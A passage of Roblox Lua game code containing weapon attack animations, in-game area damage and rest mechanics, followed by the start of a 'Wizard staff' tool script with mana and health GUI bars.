                RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25*i), 0, math.rad(-4+4*i)) * CFrame.new(0, 0.5*i, -0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35*i), 0, math.rad(4-4*i)) * CFrame.new(0, 0.4*i, 0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-40+75*i), 0, math.rad(-20*i))
                bg.cframe = CF * CFrame.Angles(0, math.rad(380*i), 0)
                bp.position = Orig.p + Vector3.new(0, 15.1-16.7*i, 0)
                wait()
        end
        coroutine.resume(coroutine.create(function()
                local frr = Cam.CoordinateFrame
                for i = 1, math.random(10,16) do
                        wait()
                        Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
                end
        end))
        PlaySound(smashsound)
        local pos = CF * CFrame.new(-2, -3, -3).p
        EndEffect()
        local p = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p.CFrame = CFrame.new(pos)
        local p2 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p2.CFrame = CFrame.new(pos)
        local p3 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p3.CFrame = CFrame.new(pos)
        local m3 = Instance.new("SpecialMesh",p3)
        m3.MeshType = "Sphere"
        PlaySound(boom)
        local m2 = Instance.new("CylinderMesh",p2)
        local m = Add.Mesh(p, "http://www.roblox.com/asset/?id=20329976", 1, 1.2, 1)
        local tab = {}
        coroutine.resume(coroutine.create(function()
                for x = 0, 1.04, 0.04 do
                        wait()
                        local thing = 33*x
                        m.Scale = Vector3.new(21*x, 5*x, 21*x)
                        m2.Scale = Vector3.new(thing, 1, thing)
                        m3.Scale = Vector3.new(thing*0.93, thing*0.7, thing*0.93)
                        p.Transparency = x
                        p2.Transparency = x
                        p3.Transparency = x
                        for i, v in pairs(workspace:children()) do
                                local h = getHumanoid(v)
                                local to = v:findFirstChild("Torso")
                                if h ~= nil and to ~= nil and find(tab, v) == nil then
                                        if (to.Position - pos).magnitude < (thing/2) then
                                                damage(h, to, 0.5, Prop.ShockDMG/2, Prop.ShockDMG)
                                                to.Velocity = CFrame.new(pos, to.Position).lookVector * 60
                                                to.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
                                                h.PlatformStand = true
                                                table.insert(tab, v)
                                                coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
                                        end
                                end
                        end
                end
                p:remove()
                p2:remove()
                p3:remove()
        end))
        wait(0.8)
        for i = 0, 1, Prop.AS*0.8 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-30+20*i), math.rad(40-90+50*i)) * CFrame.new(0, 0, -0.8+0.8*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125+40*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.45+0.1+0.35*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25-15*i), 0, 0) * CFrame.new(0, 0.5-0.5*i, -0.8+0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35+45*i), 0, 0) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10+25*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7-0.2*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-40+75-35*i), 0, math.rad(-20+20*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, 15.1-16.7+1.6*i, 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function flipsmash(mouse)
        local Orig = torso.CFrame
        local mouseHit = mouse
        local CF = ComputePos(Orig.p, mouseHit)
        local p, t = RayCast(torso.Position, torso.Position + Vector3.new(0, -5, 0), 5, 0.5)
        local ahp = (CF * CFrame.new(0, 0, -14.5))
        local p2, t2 = RayCast(ahp.p, (ahp * CFrame.new(0, -5, 0)).p, 5, 0.5)
        if t and t2 and Prop.Rage >= 90 then
        Prop.Rage = Prop.Rage - 90
        attach()
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bg.cframe = CF
        local cen = CF * CFrame.new(0, -1.2, -1.5-6.5)
        for i = 0, 1, 0.08 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100*i), math.rad(-50*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -1*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, -1.2*i, -1.5*i).p
                wait()
        end
        wait(0.15)
        hum.PlatformStand = true
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70*i), math.rad(-50), math.rad(-50)) * CFrame.new(0.2, 0, 0.2)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50*i), 0, math.rad(-40+30*i)) * CFrame.new(-0.2, -0.4, 0.5)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-10*i), 0, math.rad(-10)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+70*i), 0, math.rad(10)) * CFrame.new(0, 0.4-0.4*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6)
                neck.C0 = necko * CFrame.Angles(math.rad(30-40*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-90*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        PlaySound(slash)
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70-80*i), math.rad(-50+60*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50-125*i), 0, math.rad(-40+30+45*i)) * CFrame.new(-0.2+0.2*i, -0.4-0.5*i, 0.5-0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5), 0, math.rad(-10)) * CFrame.new(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5), 0, math.rad(10)) * CFrame.new(0, 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6-2.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-10), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-90-90*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180-45-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        StartEffect(maintip)
        PlaySound(slash)
        for i = 0, 1, 0.06 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-50*i), math.rad(40-85*i)) * CFrame.new(0, -0.85+0.45*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130*i), 0, math.rad(35)) * CFrame.new(0, -0.9+0.3*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80*i), 0, math.rad(-10)) * CFrame.new(0, 0.4*i, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20*i), 0, math.rad(10)) * CFrame.new(0, 0.7*i, -1*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6)
                neck.C0 = necko * CFrame.Angles(math.rad(-10+50*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-180-190*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(90-90*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        coroutine.resume(coroutine.create(function()
                local frr = Cam.CoordinateFrame
                for i = 1, math.random(13,20) do
                        wait()
                        Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
                end
        end))
        PlaySound(smashsound)
        PlaySound(boomboom)
        EndEffect()
        local poo = Vector3.new(maintip.Position.x, t2.Position.y + t2.Size.y/2, maintip.Position.z)
        local siz = math.random(65,115)/10
        local partie = Part(workspace, true, false, 1, 0, "White", siz, 0.2, siz, true)
        partie.CFrame = CFrame.new(poo) * CFrame.Angles(0, math.rad(math.random(0, 360)), 0)
        local decc = Instance.new("Decal",partie)
        decc.Shiny = 0
        decc.Specular = 0
        decc.Texture = "http://www.roblox.com/asset/?id=49173398"
        decc.Face = "Top"
        local count = 0
        for i, v in pairs(workspace:children()) do
                local h = getHumanoid(v)
                local to = v:findFirstChild("Torso")
                if h ~= nil and to ~= nil then
                        if (to.Position - poo).magnitude < 15 then
                                count = count + 1
                                local Maxhp = h.MaxHealth
                                if Maxhp > 5000 then Maxhp = 5000 end
                                damage(h, to, 0.5, 0, Maxhp+5)
                                to.Velocity = CFrame.new(poo, to.Position).lookVector * 30
                                to.Velocity = to.Velocity + Vector3.new(0, 60, 0)
                                to.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                                h.PlatformStand = true
                                coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
                                if count >= 2 then break end
                        end
                end
        end
        coroutine.resume(coroutine.create(function() wait(math.random(7,14)) partie:remove() end))
        wait(0.6)
        for i = 0, 1, 0.06 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-50+40*i), math.rad(40-85+45*i)) * CFrame.new(0, -0.85+0.45+0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130+45*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.9+0.3+0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80+75*i), 0, math.rad(-10+10*i)) * CFrame.new(0, 0.4-0.4*i, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20-15*i), 0, math.rad(10-10*i)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10+25*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6+1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-10+50-40*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = cen * CFrame.new(0, 1.2*i, -6.5).p
                wait()
        end
        hum.PlatformStand = false
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function spin(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local CF = ComputePos(Orig.p, mouseHit)
        local p, t = RayCast(torso.Position, CF * CFrame.new(0, -7, -1.5).p, 5, 0.5)
        if t then
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = Orig.p
        bg.cframe = CF
        PlaySound(slash)
        for i = 0, 1, 0.11 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(20*i), math.rad(120*i), math.rad(20*i)) * CFrame.new(0, 0, 0)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100*i), 0, math.rad(20*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60*i), 0, math.rad(40*i)) * CFrame.new(0, -0.8*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(10*i), 0, 0) * CFrame.new(0, 0.3*i, -0.2*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0)
                neck.C0 = necko * CFrame.Angles(math.rad(-15*i), 0, math.rad(-30*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                wait()
        end
        local posg = CF * CFrame.new(0, -0.6, -4)
        PlaySound(hitsound, 0.9)
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(20-20*i), math.rad(120+10*i), math.rad(20)) * CFrame.new(0, -0.8*i, 0.4*i)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60*i), 0, math.rad(20-20*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40*i), 0, math.rad(40-50*i)) * CFrame.new(0, -0.8+0.3*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(10-10*i), 0, 0) * CFrame.new(0, 0.3-0.3*i, -0.2+0.2*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25+25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35*i)) * CFrame.new(0, 0, -0.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-15+25*i), 0, math.rad(-30+30*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, 1*i, -2*i).p
                wait()
        end
        hum.PlatformStand = true
        bg.Parent = handle
        bg.cframe = CF * CFrame.Angles(math.pi, math.pi, 0)
        bp.Parent = handle
        bp.position = posg.p
        StartEffect(Lleg)
        Leghurt = true
        PlaySound(slash)
        for i = 0, 1, 0.09 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90*i), math.rad(130-40*i), math.rad(20-40*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
                RAW.C1 = CFrame.new(0, 0.5+0.5*i, 0) * CFrame.Angles(math.rad(100-60+60*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40-20+60*i), 0, math.rad(40-50+10*i)) * CFrame.new(0, -0.8+0.3-0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(10-35*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90*i), 0)
                wait()
        end
        for i = 0, 1, 0.055 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(-20)) * CFrame.new(0, 0, 0)
                RAW.C1 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(100), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60), 0, 0) * CFrame.new(0, -1, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
                neck.C0 = necko * CFrame.Angles(math.rad(-25), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90+270*i), 0)
                wait()
        end
        EndEffect()
        Leghurt = false
        for i = 0, 1, 0.12 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90+90*i), math.rad(90+40*i), math.rad(-20+40*i)) * CFrame.new(0, -0.8*i, 0.4*i)
                RAW.C1 = CFrame.new(0, 1-0.5*i, 0) * CFrame.Angles(math.rad(100-60*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-60*i), 0, 0) * CFrame.new(0, -1+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10-25*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5+25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
                neck.C0 = necko * CFrame.Angles(math.rad(-25+25*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(360), 0)
                wait()
        end
        bg.Parent = torso
        bp.Parent = torso
        bg.cframe = CF
        for i = 0, 1, 0.14 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(90+40-130*i), math.rad(-20+40-20*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60-40*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, -1+0.5+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35+35*i)) * CFrame.new(0, 0, 1-1*i)
                neck.C0 = necko * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, 0, -2+1*i).p
                bg.cframe = CF
                wait()
        end
        hum.PlatformStand = false
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function rest()
        local Orig = torso.CFrame
        local CF = ComputePos(Orig.p, Orig * CFrame.new(0, 0, -5).p)
        local p, t = RayCast(CF.p, CF * CFrame.new(0, -6, 0.5).p, 6, 0.5)
        if t then
        attach()
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = CF.p
        bg.cframe = CF
        local cen = CF * CFrame.new(0, -2.5, 0)
        RestingAnim = true
        hum.PlatformStand = true
        local standup = function()
                Resting = false
                bp.Parent = torso
                cen = ComputePos(torso.CFrame.p, torso.CFrame * CFrame.new(0, 0, -5).p) * CFrame.new(0, 0, -2.5)
                for i = 1, 0, -0.12 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
                        RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, 0, -0.4)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, 0, -0.4)
                        neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
                        bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
                        bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
                        wait()
                end
                for i = 1, 0, -0.17 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
                        RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
                        neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
                        bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
                        bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
                        wait()
                end
                hum.PlatformStand = false
                bg:remove()
                bp:remove()
                normal()
                Able = true
                RestingAnim = false
        end
        local connec = hum.Changed:connect(function()
                if hum.PlatformStand == false then
                        coroutine.resume(coroutine.create(function()
                                standup()
                        end))
                        standup = nil
                        connec:disconnect()
                end
        end)
        local lasthp = hum.Health
        local conn = hum.HealthChanged:connect(function(hp)
                if lasthp - hp > 0.8 then
                        hum.PlatformStand = false
                        conn:disconnect()
                end
                lasthp = hp
        end)
        coroutine.resume(coroutine.create(function()
                repeat wait() until Resting
                while Resting do
                        wait()
                        if torso.Velocity.magnitude > 4 then
                                hum.PlatformStand = false
                                break
                        end
                end
        end))
        for i = 0, 1, 0.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, 0, -0.4*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, 0, -0.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
                bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
                wait()
        end
        for i = 0, 1, 0.07 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, -0.4*i, -0.4)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, -0.4*i, -0.4)
                neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
                bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
                wait()
        end
        Resting = true
        coroutine.resume(coroutine.create(function()
                wait(0.4)
                bp.Parent = nil
        end))
        coroutine.resume(coroutine.create(function()
                while Resting and selected do
                        wait(math.random(350,800)/1000)
                        hum.Health = hum.Health + math.random(1,2)
                        Prop.Rage = Prop.Rage + 1
                end
                hum.PlatformStand = false
        end))
        end
end
 
function select(mouse)
        mouse.Icon = MouseIc
        selectanim()
        selected = true
        mouse.Button1Down:connect(function()
                if Able and RestingAnim == false and hum.Sit == false then
                        Able = false
                        swing(mouse.Hit.p)
                        Able = true
                end
        end)
        mouse.Button1Down:connect(function()
                mouse.Icon = MouseDo
                mouse.Button1Up:wait()
                mouse.Icon = MouseIc
        end)
        mouse.KeyDown:connect(function(key)
                key = key:lower()
                if Able and RestingAnim == false and hum.Sit == false then
                if key == "q" then
                        Able = false
                        smash(mouse.Hit.p)
                        Able = true
                elseif key == "e" then
                        Able = false
                        swing(mouse.Hit.p)
                        Able = true
                elseif key == "r" then
                        Able = false
                        stab(mouse.Hit.p)
                        Able = true
                elseif key == "f" then
                        Able = false
                        epicsmash(mouse.Hit.p)
                        Able = true
                elseif key == "z" then
                        Able = false
                        shockwave(mouse.Hit.p)
                        Able = true
                elseif key == "x" then
                        Able = false
                        flipsmash(mouse.Hit.p)
                        Able = true
                elseif key == "t" then
                        Able = false
                        spin(mouse.Hit.p)
                        Able = true
                end
                end
                if Able then
                        if key == "g" and AbleG then
                                AbleG = false
                                if Resting == true then
                                        Resting = false
                                else
                                        rest()
                                end
                                wait(0.8)
                                AbleG = true
                        end
                end
        end)
end
 
function deselect(mouse)
        selected = false
        deselanim()
end
bin.Selected:connect(select)
bin.Deselected:connect(deselect)
]]
 
 
Wizard = [[
LocalPlayer = game.Players.LocalPlayer
Activated = false
Equipped = false
Regening = false
FireBall = false
Spikes = false
shooting = false
Mode = "Shoot"
Energy = 100
mouse = LocalPlayer:GetMouse()
t = Instance.new("Tool",LocalPlayer.Backpack)
t.Name = 'Wizard staff'
t.GripPos = Vector3.new(0,-2,0)
p = Instance.new("Part",t)
p.FormFactor = 'Custom'
p.Name = 'Handle'
p.CanCollide = false
m = Instance.new("SpecialMesh",p)
m.MeshId = 'http://www.roblox.com/asset/?id=18434043'
m.TextureId = 'http://www.roblox.com/asset/?id=26017177'
char = LocalPlayer.Character
mouse = LocalPlayer:GetMouse()
humanoid = char:findFirstChild("Humanoid")
torso = char:findFirstChild("Torso")
head = char.Head
ra = char:findFirstChild("Right Arm")
la = char:findFirstChild("Left Arm")
rl = char:findFirstChild("Right Leg")
ll = char:findFirstChild("Left Leg")
rs = torso:findFirstChild("Right Shoulder")
ls = torso:findFirstChild("Left Shoulder")
rh = torso:findFirstChild("Right Hip")
lh = torso:findFirstChild("Left Hip")
neck = torso:findFirstChild("Neck")
rj = char:findFirstChild("HumanoidRootPart"):findFirstChild("RootJoint")
anim = char:findFirstChild("Animate")
rootpart = char:findFirstChild("HumanoidRootPart")
camera = workspace.CurrentCamera
if anim then
        anim:Destroy()
end
rm = Instance.new("Motor", torso)
rm.C0 = CFrame.new(1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
rm.C1 = CFrame.new(0, 0.5, 0)
rm.Part0 = torso
rm.Part1 = ra
lm = Instance.new("Motor", torso)
lm.C0 = CFrame.new(-1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
lm.C1 = CFrame.new(0, 0.5, 0)
lm.Part0 = torso
lm.Part1 = la
rlegm = Instance.new("Motor", torso)
rlegm.C0 = CFrame.new(0.5, -1, 0) *CFrame.Angles(0, 0, 0)
rlegm.C1 = CFrame.new(0, 1, 0)
rlegm.Part0 = torso
rlegm.Part1 = rl
llegm = Instance.new("Motor", torso)
llegm.C0 = CFrame.new(-0.5, -1, 0) *CFrame.Angles(0, 0, 0)
llegm.C1 = CFrame.new(0, 1, 0)
llegm.Part0 = torso
llegm.Part1 = ll
rsc0 = rm.C0
lsc0 = lm.C0
llc0 = llegm.C0
rlc0 = rlegm.C0
neckc0 = neck.C0
rootc0 = rj.C0
PLAYERGUI = LocalPlayer.PlayerGui
GUI = Instance.new("ScreenGui",PLAYERGUI)
FRAME = Instance.new("Frame",GUI)
FRAME.Size = UDim2.new(0.5,0,0.05,0)
FRAME.BackgroundColor3 = BrickColor.new("Bright blue").Color
FRAME.BorderSizePixel = 0
TEXTLABEL = Instance.new("TextLabel",FRAME)
TEXTLABEL.Size = UDim2.new(1,0,1,0)
TEXTLABEL.BackgroundTransparency = 1
TEXTLABEL.Text = "Mana: "..tostring(Energy)
TEXTLABEL.BorderSizePixel = 0
TEXTLABEL.Font = 'Legacy'
TEXTLABEL.FontSize = 'Size24'
FRAME2 = Instance.new("Frame",GUI)
FRAME2.Size = UDim2.new(0.5,0,0.05,0)
FRAME2.BackgroundColor3 = BrickColor.new("Bright red").Color
FRAME2.BorderSizePixel = 0
FRAME2.Position = UDim2.new(0.5,0,0,0)
TEXTLABEL2 = Instance.new("TextLabel",FRAME2)
TEXTLABEL2.Size = UDim2.new(1,0,1,0)
TEXTLABEL2.BackgroundTransparency = 1
TEXTLABEL2.Text = "Health: "..tostring(humanoid.Health)
TEXTLABEL2.BorderSizePixel = 0
TEXTLABEL2.Font = 'Legacy'
TEXTLABEL2.FontSize = 'Size24'
FRAME3 = Instance.new("Frame",GUI)
FRAME3.Size = UDim2.new(0.5,0,0.05,0)
FRAME3.BackgroundColor3 = BrickColor.new("Lime green").Color
FRAME3.BorderSizePixel = 0
FRAME3.Position = UDim2.new(0.5,0,0.05,0)
TEXTLABEL3 = Instance.new("TextLabel",FRAME3)
TEXTLABEL3.Size = UDim2.new(1,0,1,0)
TEXTLABEL3.BackgroundTransparency = 1
TEXTLABEL3.Text = "Spell: Star shoot"
TEXTLABEL3.BorderSizePixel = 0
TEXTLABEL3.Font = 'Legacy'
TEXTLABEL3.FontSize = 'Size24'
function __getVelocity(p1,p2,speed)
        local dis=(p1-p2).magnitude
        if speed=="dis" then
                if dis*6>100 then
                        speed=dis*6
                else
                        speed=100
                end
        end
        local x=(p1.x-p2.x)/dis*speed
        local y=(p1.y-p2.y)/dis*speed
        local z=(p1.z-p2.z)/dis*speed
        return Vector3.new(-x,-y+10,-z)
end
function __onActivated()
        Activated = true
end
function __onDeactivated()
        Activated = false
end
function __onEquipped(mouse)
        Equipped = true
        pcall(function()
                local a = Instance.new("Explosion",LocalPlayer.Character)
                a.Position = LocalPlayer.Character['Right Arm'].Position
                a.BlastPressure = 0
                a.BlastRadius = 20
        end)
        local b = Instance.new("Fire",p)
        b.Size = 1
        b.Color = Color3.new(0, 255, 255)
        b.SecondaryColor = Color3.new(255, 255, 0)
        local w = Instance.new("Motor",char['Right Arm'])
        w.Name = 'Wizard staff weld'
        w.Part0 = char['Right Arm']
        w.Part1 = p
        w.C1 = CFrame.new(0,-1.5,0.5) * CFrame.Angles(math.rad(90),0,0)
end
